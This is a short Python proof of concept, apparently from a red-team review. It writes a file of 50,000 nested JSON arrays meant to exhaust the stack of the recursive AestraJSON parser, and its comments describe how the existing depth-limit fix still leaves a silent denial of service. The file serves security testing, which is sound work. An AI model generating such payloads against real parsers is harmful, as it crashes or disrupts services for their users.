#!/usr/bin/env python3
"""
Red Team PoC — SEC-RTM-004: JSON Parser Stack Exhaustion (DoS)
Target: AestraJSON.h parseValue() — recursive descent, kMaxJsonDepth=1024
Impact: Stack overflow at ~50k nesting levels → crash
Difficulty: Script Kiddie

Note: The fix added kMaxJsonDepth=1024 which limits recursion,
but 1024 stack frames is still enough to exhaust small-stack environments
(CI runners, containers with 2MB stack).
"""
import os, sys

def build_deep_json(depth):
    """
    Create a JSON string consisting of `depth` nested arrays ( `depth` opening `[` characters followed by `depth` closing `]` characters ).
    
    Parameters:
        depth (int): Number of nested array levels to produce.
    
    Returns:
        json_payload (str): JSON text with `depth` nested arrays (e.g., "[" * depth + "]" * depth).
    """
    return "[" * depth + "]" * depth

def main():
    """
    Create a file containing a deeply nested JSON array payload and print status information.
    
    Writes a JSON string with 50,000 nested array levels to the path given by sys.argv[1] or to 'poc_json_stack.aes' if no argument is provided, then prints the output filename, size, depth, and brief notes about expected parser behavior around kMaxJsonDepth=1024.
    """
    output = sys.argv[1] if len(sys.argv) > 1 else 'poc_json_stack.aes'
    depth = 50000  # Exceeds kMaxJsonDepth=1024 → parse returns empty JSON (safe)
    payload = build_deep_json(depth)
    
    with open(output, 'w') as f:
        f.write(payload)
    
    size = os.path.getsize(output)
    print(f"[+] PoC: {output} ({size} bytes, depth={depth})")
    print("[+] kMaxJsonDepth=1024 → parser returns empty JSON at depth 1025")
    print("[+] Without the fix: 50k frames → stack overflow → SIGSEGV")
    print("[+] With fix: silently truncated — functional DoS (empty project)")

if __name__ == '__main__':
    main()
